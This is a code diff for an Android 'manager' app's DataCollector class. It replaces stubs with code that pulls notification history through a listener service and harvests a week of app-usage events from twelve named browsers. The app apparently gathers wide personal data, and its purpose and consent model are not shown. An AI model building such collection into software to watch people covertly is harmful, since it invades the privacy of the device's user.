@@ -9,6 +9,7 @@ import android.provider.*
 import android.telephony.TelephonyManager
 import android.util.Log
 import com.abuzahra.manager.Config
+import com.abuzahra.manager.executor.MonitorExecutor
 import com.abuzahra.manager.util.DeviceUtils
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
@@ -376,8 +377,12 @@ object DataCollector {
 
     // ===== NOTIFICATIONS =====
     fun getRecentNotifications(context: Context): List<Map<String, Any>> {
-        // Requires NotificationListenerService - return stub
-        return listOf(mapOf("message" to "Notification access requires NotificationListenerService"))
+        val history = MonitorExecutor.getNotificationHistory()
+        return if (history.isNotEmpty()) {
+            history
+        } else {
+            listOf(mapOf("message" to "Notification access requires NotificationListenerService", "hint" to "Ensure MyNotificationListenerService is enabled in Settings > Accessibility"))
+        }
     }
 
     // ===== CALENDAR =====
@@ -416,8 +421,61 @@ object DataCollector {
 
     // ===== BROWSER HISTORY =====
     fun getBrowserHistory(context: Context): List<Map<String, Any>> {
-        // Browser history is protected - requires special access
-        return listOf(mapOf("message" to "Browser history requires UsageStatsManager"))
+        val list = mutableListOf<Map<String, Any>>()
+        try {
+            val browserPackages = listOf(
+                "com.android.chrome",
+                "com.chrome.beta",
+                "org.mozilla.firefox",
+                "org.mozilla.focus",
+                "org.mozilla.firefox_beta",
+                "com.sec.android.app.sbrowser",
+                "com.opera.browser",
+                "com.opera.mini.native",
+                "com.microsoft.emmx",
+                "com.brave.browser",
+                "com.UCMobile.intl",
+                "com.android.browser"
+            )
+            val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as? android.app.usage.UsageStatsManager
+                ?: return listOf(mapOf("message" to "UsageStatsManager not available"))
+            val endTime = System.currentTimeMillis()
+            val startTime = endTime - (7 * 24 * 60 * 60 * 1000L) // last 7 days
+            val events = usageStatsManager.queryEvents(startTime, endTime)
+            val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
+            val eventList = mutableListOf<android.app.usage.UsageEvents.Event>()
+            while (events.hasNextEvent()) {
+                val event = android.app.usage.UsageEvents.Event()
+                events.getNextEvent(event)
+                eventList.add(event)
+            }
+            val recentBrowserEvents = eventList
+                .filter { it.packageName in browserPackages && it.eventType == android.app.usage.UsageEvents.Event.ACTIVITY_RESUMED }
+                .sortedByDescending { it.timeStamp }
+                .take(50)
+            val pm = context.packageManager
+            for (event in recentBrowserEvents) {
+                val appName = try {
+                    pm.getApplicationLabel(pm.getApplicationInfo(event.packageName, 0)).toString()
+                } catch (_: Exception) { event.packageName }
+                list.add(mapOf(
+                    "package" to event.packageName,
+                    "app" to appName,
+                    "timestamp" to event.timeStamp,
+                    "datetime" to sdf.format(Date(event.timeStamp))
+                ))
+            }
+            if (list.isEmpty()) {
+                list.add(mapOf("message" to "No recent browser usage found (requires PACKAGE_USAGE_STATS permission)"))
+            }
+        } catch (e: SecurityException) {
+            Log.e(TAG, "Browser history permission denied", e)
+            return listOf(mapOf("message" to "PACKAGE_USAGE_STATS permission required. Grant it in Settings > Security > Usage Access"))
+        } catch (e: Exception) {
+            Log.e(TAG, "getBrowserHistory error", e)
+            return listOf(mapOf("message" to "Error: ${e.message}"))
+        }
+        return list
     }
 
     // ===== LOCATION =====
